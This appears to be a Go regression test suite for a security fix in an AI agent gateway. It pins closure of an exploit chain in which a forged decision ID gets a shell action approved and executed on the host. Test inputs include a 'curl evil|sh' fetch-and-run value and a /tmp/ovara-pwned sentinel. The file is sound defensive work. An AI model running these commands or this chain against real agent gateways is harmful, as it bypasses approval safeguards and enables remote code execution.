package handlers

// SEC-0016 regression suite — permanent preservation of the clean-room
// exploit: fabricated decision_id → approval/create → approve →
// continuation execute → sh -c on the gateway host.
//
// The chain is closed in three places and each is pinned here:
//  1. approval/create requires a gateway-produced escalated decision.
//  2. approval fields are derived from the server-recorded request —
//     caller-supplied divergences are rejected as tampering.
//  3. host executors (shell/exec/git.*) are not registered by default,
//     so even a legitimately approved shell continuation cannot run.

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"ovara.runtime.gateway/internal/approval"
	"ovara.runtime.gateway/internal/continuation"
	"ovara.runtime.gateway/internal/execution"
	"ovara.runtime.gateway/internal/models"
)

// pwnFile is what the original exploit wrote via sh -c. It must never exist.
const pwnSentinel = "shell:touch /tmp/ovara-pwned"

// rig wires the approval handler with a decision lookup backed by a fixed
// set of gateway-produced decisions — the same shape server.go builds.
type rig struct {
	handler *ApprovalHandler
	svc     *approval.Service
	cnt     *continuation.InMemoryStore
	reg     *execution.ExecutorRegistry
	mux     *http.ServeMux
}

func newRig(decisions map[string]struct {
	req  *models.ActionRequest
	resp *models.DecisionResponse
}) *rig {
	svc := approval.NewService(approval.NewInMemoryStore())
	h := NewApprovalHandler(svc)
	cnt := continuation.NewInMemoryStore()
	reg := execution.NewExecutorRegistry() // EMPTY — the secure default
	h.SetContinuationStore(cnt)
	h.SetDecisionLookup(func(id string) (*models.ActionRequest, *models.DecisionResponse, bool) {
		d, ok := decisions[id]
		if !ok {
			return nil, nil, false
		}
		return d.req, d.resp, true
	})
	mux := http.NewServeMux()
	h.RegisterRoutes(mux)
	ch := NewContinuationHandler(cnt)
	ch.SetExecutorRegistry(reg)
	ch.RegisterRoutes(mux)
	return &rig{handler: h, svc: svc, cnt: cnt, reg: reg, mux: mux}
}

func escalatedShellDecision() (*models.ActionRequest, *models.DecisionResponse) {
	return &models.ActionRequest{
			ActionType:    models.ActionType("shell"),
			Resource:      pwnSentinel,
			Environment:   models.Environment("dev"),
			AgentIdentity: &models.AgentIdentity{Issuer: "ovara-init", SubjectID: "agent-1"},
			Nonce:         "n1",
			IssuedAt:      time.Now().UTC(),
		}, &models.DecisionResponse{
			DecisionID:       "dec_real_shell",
			Decision:         models.DecisionEscalate,
			RequiresApproval: true,
			ReceiptStub:      &models.ReceiptStub{ActionDigest: "sha256:deadbeef", PolicyVersion: "v1"},
		}
}

func post(t *testing.T, mux *http.ServeMux, path string, body any) *httptest.ResponseRecorder {
	t.Helper()
	b, _ := json.Marshal(body)
	req := httptest.NewRequest(http.MethodPost, path, bytes.NewReader(b))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	return rec
}

// The original PoC: fabricated decision_id + caller-controlled shell
// resource. Must be a 404 — no approval, no continuation, no execution.
func TestSEC0016_FabricatedDecisionID(t *testing.T) {
	r := newRig(nil) // gateway produced NO decisions
	rec := post(t, r.mux, "/v1/approval/create", map[string]any{
		"decision_id": "dec_nonexistent_123",
		"action_type": "shell",
		"resource":    pwnSentinel,
	})
	if rec.Code != http.StatusNotFound {
		t.Fatalf("fabricated decision_id: got %d, want 404", rec.Code)
	}
}

// A real escalated decision + caller trying to rebind every field.
func TestSEC0016_FieldDivergenceRejected(t *testing.T) {
	req, resp := escalatedShellDecision()
	r := newRig(map[string]struct {
		req  *models.ActionRequest
		resp *models.DecisionResponse
	}{"dec_real_shell": {req, resp}})

	for _, tc := range []struct {
		name string
		body map[string]any
	}{
		{"cross-action", map[string]any{"decision_id": "dec_real_shell", "action_type": "git.push"}},
		{"cross-resource", map[string]any{"decision_id": "dec_real_shell", "resource": "shell:curl evil|sh"}},
		{"cross-agent", map[string]any{"decision_id": "dec_real_shell", "agent_id": "agent-evil"}},
		{"cross-environment", map[string]any{"decision_id": "dec_real_shell", "environment": "production"}},
	} {
		rec := post(t, r.mux, "/v1/approval/create", tc.body)
		if rec.Code != http.StatusBadRequest {
			t.Fatalf("%s: got %d, want 400", tc.name, rec.Code)
		}
	}
}

// A real decision that did NOT escalate must not grow an approval.
func TestSEC0016_NonEscalatedDecisionRejected(t *testing.T) {
	_, resp := escalatedShellDecision()
	allowResp := *resp
	allowResp.DecisionID = "dec_allow"
	allowResp.Decision = models.DecisionAllow
	allowResp.RequiresApproval = false
	req, _ := escalatedShellDecision()
	r := newRig(map[string]struct {
		req  *models.ActionRequest
		resp *models.DecisionResponse
	}{"dec_allow": {req, &allowResp}})

	rec := post(t, r.mux, "/v1/approval/create", map[string]any{"decision_id": "dec_allow"})
	if rec.Code != http.StatusConflict {
		t.Fatalf("non-escalated decision: got %d, want 409", rec.Code)
	}
}

// End-to-end exploit path with a REAL escalated shell decision: create →
// approve → execute. The default executor registry has no shell executor,
// so execution must fail closed — /tmp/ovara-pwned is never written.
func TestSEC0016_FullChainNoHostExecutor(t *testing.T) {
	req, resp := escalatedShellDecision()
	r := newRig(map[string]struct {
		req  *models.ActionRequest
		resp *models.DecisionResponse
	}{"dec_real_shell": {req, resp}})

	// 1. create — caller fields omitted entirely; server binds them.
	rec := post(t, r.mux, "/v1/approval/create", map[string]any{"decision_id": "dec_real_shell"})
	if rec.Code != http.StatusCreated {
		t.Fatalf("create: got %d, want 201 (%s)", rec.Code, rec.Body.String())
	}
	var ap approval.ApprovalRequest
	json.NewDecoder(rec.Body).Decode(&ap)
	if ap.Resource != pwnSentinel || ap.ActionType != "shell" {
		t.Fatalf("approval not bound to server request: %+v", ap)
	}
	if ap.RequestHash == "" || ap.PolicyVersion == "" {
		t.Fatalf("approval missing request binding: %+v", ap)
	}

	// 2. approve — resolved_by must carry the authenticated principal,
	// not a caller-claimed identity.
	rec = post(t, r.mux, "/v1/approval/"+ap.ApprovalID+"/approve", map[string]any{"resolved_by": "mallory"})
	if rec.Code != http.StatusOK {
		t.Fatalf("approve: got %d, want 200", rec.Code)
	}
	got, err := r.svc.GetApproval(ap.ApprovalID)
	if err != nil {
		t.Fatal(err)
	}
	if got.ResolvedBy != "unauthenticated:mallory" {
		t.Fatalf("resolved_by = %q — caller must not claim a principal; want authenticated prefix", got.ResolvedBy)
	}

	// 3. execute — the continuation exists (queued by approval), but the
	// registry holds no host executor: fail closed, nothing runs.
	var cntID string
	for _, c := range r.cnt.ListByApprovalID(ap.ApprovalID) {
		cntID = c.ContinuationID
	}
	if cntID == "" {
		t.Fatal("no continuation bound to approval")
	}
	rec = post(t, r.mux, "/v1/continuations/"+cntID+"/execute", nil)
	if rec.Code == http.StatusOK {
		t.Fatalf("shell continuation executed with no registered executor — host RCE still reachable")
	}
}

// Duplicate approvals for one decision would queue two continuations —
// the same action executing twice on a single approval (red-team B).
// Create must be idempotent: the second call returns the existing approval.
func TestSEC0016_DuplicateApprovalIdempotent(t *testing.T) {
	req, resp := escalatedShellDecision()
	r := newRig(map[string]struct {
		req  *models.ActionRequest
		resp *models.DecisionResponse
	}{"dec_real_shell": {req, resp}})

	rec1 := post(t, r.mux, "/v1/approval/create", map[string]any{"decision_id": "dec_real_shell"})
	rec2 := post(t, r.mux, "/v1/approval/create", map[string]any{"decision_id": "dec_real_shell"})
	var a1, a2 approval.ApprovalRequest
	json.NewDecoder(rec1.Body).Decode(&a1)
	json.NewDecoder(rec2.Body).Decode(&a2)
	if a1.ApprovalID == "" || a1.ApprovalID != a2.ApprovalID {
		t.Fatalf("second create must return the SAME approval (%q vs %q) — a duplicate would double-execute", a1.ApprovalID, a2.ApprovalID)
	}
}

// Nil decision lookup = no provenance source = fail closed entirely.
func TestSEC0016_NoLookupFailsClosed(t *testing.T) {
	svc := approval.NewService(approval.NewInMemoryStore())
	h := NewApprovalHandler(svc)
	mux := http.NewServeMux()
	h.RegisterRoutes(mux)
	rec := post(t, mux, "/v1/approval/create", map[string]any{
		"decision_id": "dec_anything", "action_type": "shell", "resource": pwnSentinel,
	})
	if rec.Code != http.StatusNotFound {
		t.Fatalf("nil lookup: got %d, want 404 (fail closed)", rec.Code)
	}
}
